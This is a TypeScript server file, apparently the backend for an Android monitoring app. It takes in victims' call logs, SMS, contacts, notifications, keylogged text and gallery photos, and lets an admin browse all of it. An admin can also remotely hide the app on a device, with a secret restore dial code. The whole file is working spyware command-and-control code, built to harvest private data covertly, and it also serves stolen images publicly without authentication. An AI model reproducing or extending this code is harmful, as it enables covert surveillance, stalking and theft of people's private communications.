import {
  corsHeaders,
  json,
  requireAuth,
  signJwt,
  verifyGoogleIdToken,
} from "./auth";
import {
  ensureUserVisibility,
  getUserBundle,
  parseItems,
  publicGalleryUrl,
  updateSyncStatus,
} from "./db";
import type { Env } from "./types";

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    if (request.method === "OPTIONS") {
      return new Response(null, { status: 204, headers: corsHeaders() });
    }

    const url = new URL(request.url);
    const path = url.pathname.replace(/\/+$/, "") || "/";

    try {
      if (request.method === "GET" && path === "/health") {
        return json({ ok: true, service: "bushorat-api" });
      }

      if (request.method === "POST" && path === "/auth/google") {
        return handleGoogleAuth(request, env);
      }

      if (request.method === "POST" && path === "/auth/admin") {
        return handleAdminAuth(request, env);
      }

      if (request.method === "GET" && path.startsWith("/gallery/")) {
        return serveGalleryObject(path, env);
      }

      // User routes
      if (path === "/me/profile" && request.method === "PUT") {
        return putProfile(request, env);
      }
      if (path === "/me/device-info" && request.method === "PUT") {
        return putDeviceInfo(request, env);
      }
      if (path === "/me/call-logs" && request.method === "POST") {
        return postCallLogs(request, env);
      }
      if (path === "/me/sms" && request.method === "POST") {
        return postSms(request, env);
      }
      if (path === "/me/contacts" && request.method === "POST") {
        return postContacts(request, env);
      }
      if (path === "/me/notifications" && request.method === "POST") {
        return postNotifications(request, env);
      }
      if (path === "/me/keylogs" && request.method === "POST") {
        return postKeylogs(request, env);
      }
      if (path === "/me/gallery" && request.method === "POST") {
        return postGallery(request, env);
      }
      if (path === "/me/visibility" && request.method === "GET") {
        return getMyVisibility(request, env);
      }
      if (path === "/me/sync-status" && request.method === "PUT") {
        return putSyncStatus(request, env);
      }

      // Admin routes
      if (path === "/admin/users" && request.method === "GET") {
        return listUsers(request, env);
      }
      if (path.startsWith("/admin/users/") && request.method === "GET") {
        return getAdminUser(request, env, path);
      }
      if (path.match(/^\/admin\/users\/[^/]+\/visibility$/) && request.method === "PUT") {
        return putAdminVisibility(request, env, path);
      }

      return json({ error: "Not found", path }, 404);
    } catch (error) {
      const message = error instanceof Error ? error.message : "Server error";
      console.error(message, error);
      return json({ error: message }, 500);
    }
  },
};

async function handleGoogleAuth(request: Request, env: Env): Promise<Response> {
  const body = (await request.json()) as { idToken?: string };
  if (!body.idToken) return json({ error: "idToken required" }, 400);

  const google = await verifyGoogleIdToken(body.idToken, env.GOOGLE_CLIENT_ID);
  if (!google) return json({ error: "Invalid Google token" }, 401);

  const now = Date.now();
  const existing = await env.DB.prepare(`SELECT id FROM users WHERE id = ? OR email = ?`)
    .bind(google.sub, google.email)
    .first<{ id: string }>();

  const userId = existing?.id || google.sub;

  await env.DB.prepare(
    `INSERT INTO users (id, email, display_name, created_at, last_login)
     VALUES (?, ?, ?, ?, ?)
     ON CONFLICT(id) DO UPDATE SET email = excluded.email, display_name = excluded.display_name, last_login = excluded.last_login`
  )
    .bind(userId, google.email, google.name, now, now)
    .run();

  await env.DB.prepare(
    `INSERT INTO profiles (user_id, email, display_name, device_model, last_seen)
     VALUES (?, ?, ?, '', ?)
     ON CONFLICT(user_id) DO UPDATE SET email = excluded.email, display_name = excluded.display_name, last_seen = excluded.last_seen`
  )
    .bind(userId, google.email, google.name, now)
    .run();

  await ensureUserVisibility(env.DB, userId);

  const token = await signJwt(
    { sub: userId, email: google.email, role: "user" },
    env.JWT_SECRET
  );

  return json({
    token,
    userId,
    email: google.email,
    displayName: google.name,
  });
}

async function handleAdminAuth(request: Request, env: Env): Promise<Response> {
  const body = (await request.json()) as { email?: string; password?: string };
  if (!body.email || !body.password) {
    return json({ error: "email and password required" }, 400);
  }
  if (body.email !== env.ADMIN_EMAIL || body.password !== env.ADMIN_PASSWORD) {
    return json({ error: "Invalid credentials" }, 401);
  }
  const token = await signJwt(
    { sub: "admin", email: body.email, role: "admin" },
    env.JWT_SECRET
  );
  return json({ token, email: body.email, role: "admin" });
}

async function putProfile(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const body = (await request.json()) as Record<string, unknown>;
  const now = Date.now();
  await env.DB.prepare(
    `INSERT INTO profiles (user_id, email, display_name, device_model, last_seen)
     VALUES (?, ?, ?, ?, ?)
     ON CONFLICT(user_id) DO UPDATE SET
       email = excluded.email,
       display_name = excluded.display_name,
       device_model = excluded.device_model,
       last_seen = excluded.last_seen`
  )
    .bind(
      auth.payload.sub,
      String(body.email || auth.payload.email || ""),
      String(body.displayName || ""),
      String(body.deviceModel || ""),
      Number(body.lastSeen || now)
    )
    .run();
  return json({ ok: true });
}

async function putDeviceInfo(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const body = (await request.json()) as Record<string, unknown>;
  const now = Date.now();
  await env.DB.prepare(
    `INSERT INTO device_info (user_id, payload, uploaded_at)
     VALUES (?, ?, ?)
     ON CONFLICT(user_id) DO UPDATE SET payload = excluded.payload, uploaded_at = excluded.uploaded_at`
  )
    .bind(auth.payload.sub, JSON.stringify(body), now)
    .run();
  await updateSyncStatus(env.DB, auth.payload.sub, "device_info", 1);
  return json({ ok: true });
}

async function postCallLogs(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const items = parseItems(await request.json());
  let count = 0;
  for (const item of items) {
    const id = String(item.id || "");
    if (!id) continue;
    const payload = { ...item, dataType: "call_log", userId: auth.payload.sub };
    await env.DB.prepare(
      `INSERT INTO call_logs (id, user_id, number, type, date, duration, uploaded_at, payload)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(user_id, id) DO UPDATE SET
         number = excluded.number, type = excluded.type, date = excluded.date,
         duration = excluded.duration, uploaded_at = excluded.uploaded_at, payload = excluded.payload`
    )
      .bind(
        id,
        auth.payload.sub,
        String(item.number || ""),
        String(item.type || ""),
        Number(item.date || 0),
        Number(item.duration || 0),
        Number(item.uploadedAt || Date.now()),
        JSON.stringify(payload)
      )
      .run();
    count++;
  }
  await updateSyncStatus(env.DB, auth.payload.sub, "call_logs", count);
  return json({ ok: true, count });
}

async function postSms(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const items = parseItems(await request.json());
  let count = 0;
  for (const item of items) {
    const id = String(item.id || "");
    if (!id) continue;
    const payload = { ...item, dataType: "sms", userId: auth.payload.sub };
    await env.DB.prepare(
      `INSERT INTO sms (id, user_id, address, body, date, type, uploaded_at, payload)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(user_id, id) DO UPDATE SET
         address = excluded.address, body = excluded.body, date = excluded.date,
         type = excluded.type, uploaded_at = excluded.uploaded_at, payload = excluded.payload`
    )
      .bind(
        id,
        auth.payload.sub,
        String(item.address || ""),
        String(item.body || ""),
        Number(item.date || 0),
        String(item.type || ""),
        Number(item.uploadedAt || Date.now()),
        JSON.stringify(payload)
      )
      .run();
    count++;
  }
  await updateSyncStatus(env.DB, auth.payload.sub, "sms", count);
  return json({ ok: true, count });
}

async function postContacts(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const items = parseItems(await request.json());
  let count = 0;
  for (const item of items) {
    const id = String(item.id || "");
    if (!id) continue;
    const payload = { ...item, dataType: "contact", userId: auth.payload.sub };
    await env.DB.prepare(
      `INSERT INTO contacts (id, user_id, name, number, type, uploaded_at, payload)
       VALUES (?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(user_id, id) DO UPDATE SET
         name = excluded.name, number = excluded.number, type = excluded.type,
         uploaded_at = excluded.uploaded_at, payload = excluded.payload`
    )
      .bind(
        id,
        auth.payload.sub,
        String(item.name || ""),
        String(item.number || ""),
        String(item.type || ""),
        Number(item.uploadedAt || Date.now()),
        JSON.stringify(payload)
      )
      .run();
    count++;
  }
  await updateSyncStatus(env.DB, auth.payload.sub, "contacts", count);
  return json({ ok: true, count });
}

async function postNotifications(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const items = parseItems(await request.json());
  let count = 0;
  for (const item of items) {
    const id = String(item.id || "");
    if (!id) continue;
    const payload = { ...item, dataType: "notification", userId: auth.payload.sub };
    await env.DB.prepare(
      `INSERT INTO notifications (id, user_id, title, text, package_name, timestamp, uploaded_at, payload)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(user_id, id) DO UPDATE SET
         title = excluded.title, text = excluded.text, package_name = excluded.package_name,
         timestamp = excluded.timestamp, uploaded_at = excluded.uploaded_at, payload = excluded.payload`
    )
      .bind(
        id,
        auth.payload.sub,
        String(item.title || ""),
        String(item.text || ""),
        String(item.packageName || ""),
        Number(item.timestamp || 0),
        Number(item.uploadedAt || Date.now()),
        JSON.stringify(payload)
      )
      .run();
    count++;
  }
  await updateSyncStatus(env.DB, auth.payload.sub, "notifications", count);
  return json({ ok: true, count });
}

async function postKeylogs(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const items = parseItems(await request.json());
  let count = 0;
  for (const item of items) {
    const id = String(item.id || "");
    if (!id) continue;
    const payload = { ...item, dataType: "keylog", userId: auth.payload.sub };
    await env.DB.prepare(
      `INSERT INTO keylogs (id, user_id, package_name, event_type, text, before_text, class_name, timestamp, uploaded_at, payload)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
       ON CONFLICT(user_id, id) DO UPDATE SET
         package_name = excluded.package_name, event_type = excluded.event_type, text = excluded.text,
         before_text = excluded.before_text, class_name = excluded.class_name, timestamp = excluded.timestamp,
         uploaded_at = excluded.uploaded_at, payload = excluded.payload`
    )
      .bind(
        id,
        auth.payload.sub,
        String(item.packageName || ""),
        String(item.eventType || ""),
        String(item.text || ""),
        String(item.beforeText || ""),
        String(item.className || ""),
        Number(item.timestamp || 0),
        Number(item.uploadedAt || Date.now()),
        JSON.stringify(payload)
      )
      .run();
    count++;
  }
  await updateSyncStatus(env.DB, auth.payload.sub, "keylogs", count);
  return json({ ok: true, count });
}

async function postGallery(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const body = (await request.json()) as {
    id?: string;
    fileName?: string;
    filePath?: string;
    mimeType?: string;
    timestamp?: number;
    imageBase64?: string;
  };
  if (!body.id || !body.imageBase64) {
    return json({ error: "id and imageBase64 required" }, 400);
  }

  if (!env.GALLERY) {
    return json({
      error: "Gallery storage (R2) is not configured yet. Enable R2 in the Cloudflare dashboard and redeploy.",
    }, 503);
  }

  const mimeType = body.mimeType || "image/jpeg";
  const ext = mimeType.includes("png") ? ".png" : mimeType.includes("webp") ? ".webp" : ".jpg";
  const r2Key = `gallery/${auth.payload.sub}/${body.id}${ext}`;
  const binary = Uint8Array.from(atob(body.imageBase64), (c) => c.charCodeAt(0));

  await env.GALLERY.put(r2Key, binary, {
    httpMetadata: { contentType: mimeType },
  });

  const url = publicGalleryUrl(request, auth.payload.sub, body.id);
  const now = Date.now();
  const payload = {
    dataType: "gallery",
    mimeType,
    fileName: body.fileName || `${body.id}${ext}`,
    filePath: body.filePath || "",
    timestamp: body.timestamp || now,
    uploadedAt: now,
    url,
    userId: auth.payload.sub,
  };

  await env.DB.prepare(
    `INSERT INTO gallery (id, user_id, file_name, file_path, mime_type, url, r2_key, timestamp, uploaded_at, payload)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     ON CONFLICT(user_id, id) DO UPDATE SET
       file_name = excluded.file_name, file_path = excluded.file_path, mime_type = excluded.mime_type,
       url = excluded.url, r2_key = excluded.r2_key, timestamp = excluded.timestamp,
       uploaded_at = excluded.uploaded_at, payload = excluded.payload`
  )
    .bind(
      body.id,
      auth.payload.sub,
      payload.fileName,
      payload.filePath,
      mimeType,
      url,
      r2Key,
      payload.timestamp,
      now,
      JSON.stringify(payload)
    )
    .run();

  await updateSyncStatus(env.DB, auth.payload.sub, "gallery", 1);
  return json({ ok: true, url, id: body.id });
}

async function getMyVisibility(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  await ensureUserVisibility(env.DB, auth.payload.sub);
  const row = await env.DB.prepare(`SELECT * FROM app_visibility WHERE user_id = ?`)
    .bind(auth.payload.sub)
    .first();
  return json({
    is_hidden: Boolean((row as { is_hidden: number } | null)?.is_hidden),
    secret_code: (row as { secret_code: string } | null)?.secret_code || "",
    restore_dial_code: (row as { restore_dial_code: string } | null)?.restore_dial_code || "*#*#737826#*#*",
    hidden_at: (row as { hidden_at: number | null } | null)?.hidden_at ?? null,
    shown_at: (row as { shown_at: number | null } | null)?.shown_at ?? null,
  });
}

async function putSyncStatus(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["user"]);
  if (!auth.ok) return auth.response;
  const body = (await request.json()) as { dataType?: string; count?: number };
  if (!body.dataType) return json({ error: "dataType required" }, 400);
  await updateSyncStatus(env.DB, auth.payload.sub, body.dataType, Number(body.count || 0));
  return json({ ok: true });
}

async function listUsers(request: Request, env: Env): Promise<Response> {
  const auth = await requireAuth(request, env, ["admin"]);
  if (!auth.ok) return auth.response;
  const result = await env.DB.prepare(
    `SELECT u.id, u.email, u.display_name, u.last_login,
            p.device_model, p.last_seen,
            COALESCE(v.is_hidden, 0) AS is_hidden
     FROM users u
     LEFT JOIN profiles p ON p.user_id = u.id
     LEFT JOIN app_visibility v ON v.user_id = u.id
     ORDER BY COALESCE(p.last_seen, u.last_login) DESC`
  ).all();
  return json({ users: result.results || [] });
}

async function getAdminUser(request: Request, env: Env, path: string): Promise<Response> {
  const auth = await requireAuth(request, env, ["admin"]);
  if (!auth.ok) return auth.response;

  const parts = path.split("/").filter(Boolean);
  // /admin/users/:id or /admin/users/:id/:dataType
  const userId = parts[2];
  const dataType = parts[3];
  if (!userId) return json({ error: "userId required" }, 400);

  if (!dataType) {
    return json(await getUserBundle(env, userId));
  }

  const allowed: Record<string, string> = {
    "call-logs": "call_logs",
    call_logs: "call_logs",
    sms: "sms",
    contacts: "contacts",
    notifications: "notifications",
    keylogs: "keylogs",
    gallery: "gallery",
    profile: "profiles",
    "device-info": "device_info",
    device_info: "device_info",
    visibility: "app_visibility",
  };
  const table = allowed[dataType];
  if (!table) return json({ error: "Unknown data type" }, 400);

  if (table === "profiles" || table === "device_info" || table === "app_visibility") {
    const row = await env.DB.prepare(`SELECT * FROM ${table} WHERE user_id = ?`).bind(userId).first();
    return json({ data: row });
  }

  const rows = await env.DB.prepare(`SELECT * FROM ${table} WHERE user_id = ? ORDER BY uploaded_at DESC LIMIT 1000`)
    .bind(userId)
    .all();
  return json({ items: rows.results || [] });
}

async function putAdminVisibility(request: Request, env: Env, path: string): Promise<Response> {
  const auth = await requireAuth(request, env, ["admin"]);
  if (!auth.ok) return auth.response;
  const userId = path.split("/")[3];
  if (!userId) return json({ error: "userId required" }, 400);

  const body = (await request.json()) as { is_hidden?: boolean; secret_code?: string };
  const isHidden = Boolean(body.is_hidden);
  const now = Date.now();
  await ensureUserVisibility(env.DB, userId);

  const existing = await env.DB.prepare(`SELECT secret_code FROM app_visibility WHERE user_id = ?`)
    .bind(userId)
    .first<{ secret_code: string }>();

  let secret = body.secret_code || existing?.secret_code || "";
  if (isHidden && !secret) {
    secret = String(Math.floor(100000 + Math.random() * 900000));
  }

  await env.DB.prepare(
    `UPDATE app_visibility
     SET is_hidden = ?, secret_code = ?, restore_dial_code = '*#*#737826#*#*',
         hidden_at = CASE WHEN ? = 1 THEN ? ELSE hidden_at END,
         shown_at = CASE WHEN ? = 0 THEN ? ELSE shown_at END
     WHERE user_id = ?`
  )
    .bind(isHidden ? 1 : 0, secret, isHidden ? 1 : 0, now, isHidden ? 0 : 1, now, userId)
    .run();

  return json({
    ok: true,
    is_hidden: isHidden,
    secret_code: secret,
    restore_dial_code: "*#*#737826#*#*",
  });
}

async function serveGalleryObject(path: string, env: Env): Promise<Response> {
  // /gallery/{userId}/{imageId}
  const parts = path.split("/").filter(Boolean);
  if (parts.length < 3) return json({ error: "Not found" }, 404);
  const userId = parts[1];
  const imageId = parts[2];

  const row = await env.DB.prepare(`SELECT r2_key, mime_type FROM gallery WHERE user_id = ? AND id = ?`)
    .bind(userId, imageId)
    .first<{ r2_key: string; mime_type: string }>();

  if (!row?.r2_key) return json({ error: "Not found" }, 404);
  if (!env.GALLERY) return json({ error: "Gallery storage not configured" }, 503);
  const object = await env.GALLERY.get(row.r2_key);
  if (!object) return json({ error: "Not found" }, 404);

  const headers = new Headers();
  object.writeHttpMetadata(headers);
  headers.set("Content-Type", row.mime_type || "image/jpeg");
  headers.set("Cache-Control", "public, max-age=86400");
  Object.entries(corsHeaders()).forEach(([k, v]) => headers.set(k, v));

  return new Response(object.body, { headers });
}
